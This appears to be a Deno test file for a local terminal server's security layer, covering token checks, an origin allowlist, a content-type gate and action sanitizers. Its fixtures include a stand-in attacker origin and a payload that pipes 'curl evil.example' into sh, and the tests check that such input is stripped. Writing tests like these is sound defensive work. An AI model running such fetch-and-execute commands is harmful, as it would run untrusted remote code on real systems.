// Copyright 2023-present Eser Ozvataf and other contributors. All rights reserved. Apache-2.0 license.

import { assert, assertEquals, assertFalse } from "@std/assert";
import * as auth from "./auth.ts";
import {
  sanitizeRemoteAction,
  sanitizeRemoteMessage,
} from "./terminal/sanitize.ts";

const PORT = 3000;

const req = (
  url: string,
  init?: RequestInit,
): Request => new Request(url, init);

Deno.test("createToken mints a fresh 32-byte hex token each call", () => {
  const a = auth.createToken();
  const b = auth.createToken();

  assertEquals(a.length, 64);
  assert(/^[0-9a-f]{64}$/.test(a));
  assert(a !== b, "tokens must not repeat");
});

Deno.test("query token: only the exact value is accepted", () => {
  const token = auth.createToken();

  assert(
    auth.hasValidQueryToken(
      req(`http://localhost:${PORT}/mux?token=${token}`),
      token,
    ),
  );

  // The attack this exists to stop: a page on another origin dialling /mux.
  assertFalse(
    auth.hasValidQueryToken(req(`http://localhost:${PORT}/mux`), token),
  );
  assertFalse(
    auth.hasValidQueryToken(req(`http://localhost:${PORT}/mux?token=`), token),
  );
  assertFalse(
    auth.hasValidQueryToken(
      req(`http://localhost:${PORT}/mux?token=${token}x`),
      token,
    ),
  );
  assertFalse(
    auth.hasValidQueryToken(
      req(`http://localhost:${PORT}/mux?token=${"0".repeat(64)}`),
      token,
    ),
  );
});

Deno.test("header token: only the exact value is accepted", () => {
  const token = auth.createToken();

  assert(
    auth.hasValidHeaderToken(
      req(`http://localhost:${PORT}/api/tab`, {
        method: "POST",
        headers: { [auth.TOKEN_HEADER]: token },
      }),
      token,
    ),
  );

  assertFalse(
    auth.hasValidHeaderToken(
      req(`http://localhost:${PORT}/api/tab`, { method: "POST" }),
      token,
    ),
  );
});

Deno.test("origin allowlist covers the three loopback spellings", () => {
  for (
    const origin of [
      `http://localhost:${PORT}`,
      `http://127.0.0.1:${PORT}`,
      `http://[::1]:${PORT}`,
    ]
  ) {
    assert(
      auth.isOriginAllowed(
        req(`http://localhost:${PORT}/mux`, { headers: { origin } }),
        PORT,
      ),
      `${origin} should be allowed`,
    );
  }
});

Deno.test("origin allowlist rejects foreign and same-host-other-port origins", () => {
  for (
    const origin of [
      "https://evil.example",
      "http://localhost:9999",
      "http://192.168.1.10:3000",
      "null",
    ]
  ) {
    assertFalse(
      auth.isOriginAllowed(
        req(`http://localhost:${PORT}/mux`, { headers: { origin } }),
        PORT,
      ),
      `${origin} should be rejected`,
    );
  }
});

Deno.test("a missing Origin is allowed; the token is what gates non-browsers", () => {
  assert(auth.isOriginAllowed(req(`http://localhost:${PORT}/mux`), PORT));
});

Deno.test("only application/json passes the content-type gate", () => {
  const post = (contentType: string): Request =>
    req(`http://localhost:${PORT}/api/tab`, {
      method: "POST",
      headers: { "content-type": contentType },
      body: "{}",
    });

  assert(auth.hasJsonContentType(post("application/json")));
  assert(auth.hasJsonContentType(post("application/json; charset=utf-8")));

  // The three types an HTML form can post cross-origin without a preflight.
  assertFalse(
    auth.hasJsonContentType(post("application/x-www-form-urlencoded")),
  );
  assertFalse(auth.hasJsonContentType(post("multipart/form-data")));
  assertFalse(auth.hasJsonContentType(post("text/plain")));
});

Deno.test("sanitizer strips command/args/cwd from a remote newTab", () => {
  const hostile = {
    type: "newTab",
    kind: "terminal",
    command: "sh",
    args: ["-c", "curl evil.example | sh"],
    cwd: "/",
    title: "innocent",
  } as const;

  const cleaned = sanitizeRemoteAction(hostile) as Record<string, unknown>;

  assertEquals(cleaned["type"], "newTab");
  assertEquals(cleaned["command"], undefined);
  assertEquals(cleaned["args"], undefined);
  assertEquals(cleaned["cwd"], undefined);

  // The fields a remote client may legitimately choose survive.
  assertEquals(cleaned["kind"], "terminal");
  assertEquals(cleaned["title"], "innocent");
});

Deno.test("sanitizer leaves harmless actions untouched by identity", () => {
  const benign = { type: "nextTab" } as const;
  assert(sanitizeRemoteAction(benign) === benign);

  const newTabNoSpawn = { type: "newTab", kind: "agent" } as const;
  assert(sanitizeRemoteAction(newTabNoSpawn) === newTabNoSpawn);
});

Deno.test("sanitizeRemoteMessage only rewrites action frames", () => {
  const attach = {
    t: "attach",
    viewport: { cols: 80, rows: 24 },
  } as const;
  assert(sanitizeRemoteMessage(attach) === attach);

  const hostile = {
    t: "action",
    action: { type: "newTab", command: "sh", args: ["-c", "id"] },
  } as const;

  const cleaned = sanitizeRemoteMessage(hostile) as {
    action: Record<string, unknown>;
  };

  assertEquals(cleaned.action["command"], undefined);
  assertEquals(cleaned.action["args"], undefined);
});
